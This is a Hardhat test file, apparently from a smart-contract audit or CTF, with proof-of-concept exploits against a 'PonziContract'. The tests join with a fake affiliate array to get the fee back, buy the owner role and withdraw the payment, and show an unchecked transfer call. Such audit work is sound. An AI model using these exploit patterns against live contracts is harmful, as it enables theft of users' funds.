const { expect } = require("chai");
const { ethers } = require("hardhat");

const NAME = "PonziContract";

describe.only(NAME, function () {
  let deployer, affiliate_1, affiliate_2, affiliate_3, user;
  let ponziContract;

  beforeEach(async function () {
    [deployer, affiliate_1, affiliate_2, affiliate_3, user] =
      await ethers.getSigners();

    ponziContract = await (
      await ethers.getContractFactory(NAME, deployer)
    ).deploy();

    await ponziContract.setDeadline(ethers.MaxUint256);

    await ponziContract.addNewAffilliate(affiliate_1);
    await ponziContract.addNewAffilliate(affiliate_2);
    await ponziContract
      .connect(affiliate_3)
      .joinPonzi([affiliate_1.address, affiliate_2.address], {
        value: ethers.parseEther("2"),
      });
  });

  /**
    / Argument array to joinPonzi(address[] calldata _afilliates)
    / can take arbitrary values as long as array length is the same.
    */
  it("CriticalIssue1", async function () {
    const balanceBefore = await ethers.provider.getBalance(user.address);
    console.log("User Eth balance before joinPonzi: " + balanceBefore)

    console.log("User joins ponzi with fake afilliates array...")
    await ponziContract
      .connect(user)
      .joinPonzi([user.address, user.address, user.address], {
        value: ethers.parseEther("3"),
      });

    const balanceAfter = await ethers.provider.getBalance(user.address);
    console.log("User Eth balance after joinPonzi: " + balanceAfter)

    expect(balanceBefore - balanceAfter).to.be.closeTo(
      0,
      ethers.parseEther("0.001")
    );
    console.log("User Eth balance not changed!")
  });

  /**
    / Every affiliate can become an owner and return spent ethers right afterward
    */
  it("CriticalIssue2", async function () {
    await ponziContract.addNewAffilliate(user);

    const balanceBefore = await ethers.provider.getBalance(user.address);
    console.log("User Eth balance before claim ownership: " + balanceBefore)

    console.log("User claims ownership...")
    await ponziContract
      .connect(user)
      .buyOwnerRole(user.address, { value: ethers.parseEther("10") });
    await ponziContract
      .connect(user)
      .ownerWithdraw(user.address, ethers.parseEther("10"));

    const balanceAfter = await ethers.provider.getBalance(user.address);
    console.log("User Eth balance after claim ownership: " + balanceAfter)

    // Balance not changed
    expect(balanceBefore - balanceAfter).to.be.closeTo(
      0,
      ethers.parseEther("0.001")
    );
    console.log("User Eth balance not changed!")
  });

  /**
    / Method payable(to).call without transaction status check.
    / This can lead to confusion that ownerWithdraw executed successfully where it is not.
    */
  it("Issue3", async function () {
    await ponziContract.addNewAffilliate(user);

    const dummyContract = await (
      await (await ethers.getContractFactory("GenericContract", user)).deploy()
    ).getAddress();

    // First lets buy owner role for user
    await ponziContract
      .connect(user)
      .buyOwnerRole(user.address, { value: ethers.parseEther("10") });

    console.log("Owner tries to withdraw money to some dummyContract without receive() functionality...")
    await ponziContract
      .connect(user)
      .ownerWithdraw(dummyContract, ethers.parseEther("5"));

    expect(await ethers.provider.getBalance(dummyContract)).to.equal(0);
    console.log("dummyContract still have 0 balance, despite the transaction executed successfully!")
  });
});
